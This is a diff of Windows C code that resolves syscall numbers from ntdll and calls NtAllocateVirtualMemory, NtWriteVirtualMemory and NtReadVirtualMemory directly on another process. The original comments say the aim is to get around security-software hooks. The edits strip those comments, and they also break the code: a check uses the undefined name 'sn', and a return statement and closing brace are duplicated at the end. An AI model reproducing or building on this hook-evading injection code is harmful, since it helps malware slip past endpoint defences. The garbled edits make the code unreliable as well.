@@ -1,6 +1,5 @@
 #include "Engine.h"
 
-// Dynamically extracts the System Service Number (SSN) directly from unhooked NTDLL memory space
 DWORD DiscoverServiceNumber(const char* apiName) {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return 0;
@@ -20,12 +19,10 @@ DWORD DiscoverServiceNumber(const char* apiName) {
             WORD ordinal = ordinals[i];
             BYTE* address = (BYTE*)hNtdll + functions[ordinal];
             
-            // Raw pattern verification matching native x64 assembly configurations
             if (address[0] == 0x4C && address[1] == 0x8B && address[2] == 0xD1 && address[3] == 0xB8) {
                 return *(DWORD*)(address + 4);
             }
             
-            // Advanced fallback signature scraping if hooks are detected at the top of the function
             if (address[0] == 0xE9) { 
                 for (WORD idx = 1; idx <= 32; idx++) {
                     BYTE* neighborAddress = address + (idx * 32);
@@ -39,21 +36,19 @@ DWORD DiscoverServiceNumber(const char* apiName) {
     return 0;
 }
 
-// Low-Level Process Explorer bypassing standard API hook architectures
 DWORD __stdcall FindTargetProcessId(const wchar_t* processName) {
     DWORD ssn = DiscoverServiceNumber("NtQuerySystemInformation");
-    if (!ssn) return 0;
+    if (!sn) return 0;
 
     ULONG bufferSize = 0x10000;
     PVOID buffer = NULL;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
 
-    // Dynamically expand buffer memory allocation to handle extensive running system loads
     do {
         buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!buffer) return 0;
 
-        status = DirectSyscallBridge(ssn, 5, buffer, bufferSize, &bufferSize); // 5 = SystemProcessInformation
+        status = DirectSyscallBridge(ssn, 5, buffer, bufferSize, &bufferSize); 
         if (status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) {
             VirtualFree(buffer, 0, MEM_RELEASE);
             bufferSize *= 2;
@@ -81,7 +76,6 @@ DWORD __stdcall FindTargetProcessId(const wchar_t* processName) {
     return targetPid;
 }
 
-// Allocates virtual memory execution regions entirely bypassing OS visual hooks
 BOOL __stdcall InvokeNativeAllocation(DWORD processId, DWORD_PTR* outAddress, SIZE_T size, DWORD protect) {
     DWORD ssn = DiscoverServiceNumber("NtAllocateVirtualMemory");
     if (!ssn) return FALSE;
@@ -111,7 +105,6 @@ BOOL __stdcall InvokeNativeAllocation(DWORD processId, DWORD_PTR* outAddress, SI
     return FALSE;
 }
 
-// Bypasses typical software instrumentation points to alter raw operational memory
 BOOL __stdcall InvokeNativeMemoryWrite(DWORD processId, DWORD_PTR targetAddress, PVOID localBuffer, SIZE_T size, SIZE_T* bytesWritten) {
     DWORD ssn = DiscoverServiceNumber("NtWriteVirtualMemory");
     if (!ssn) return FALSE;
@@ -135,7 +128,6 @@ BOOL __stdcall InvokeNativeMemoryWrite(DWORD processId, DWORD_PTR targetAddress,
     return (status == STATUS_SUCCESS);
 }
 
-// High-volume silent memory acquisition engine
 BOOL __stdcall InvokeNativeMemoryRead(DWORD processId, DWORD_PTR targetAddress, PVOID localBuffer, SIZE_T size, SIZE_T* bytesRead) {
     DWORD ssn = DiscoverServiceNumber("NtReadVirtualMemory");
     if (!ssn) return FALSE;
@@ -155,6 +147,9 @@ BOOL __stdcall InvokeNativeMemoryRead(DWORD processId, DWORD_PTR targetAddress, 
 
     CloseHandle(hProcess);
     if (bytesRead) *bytesRead = read;
+
+    return (status == STATUS_SUCCESS);
+}
 
     return (status == STATUS_SUCCESS);
 }
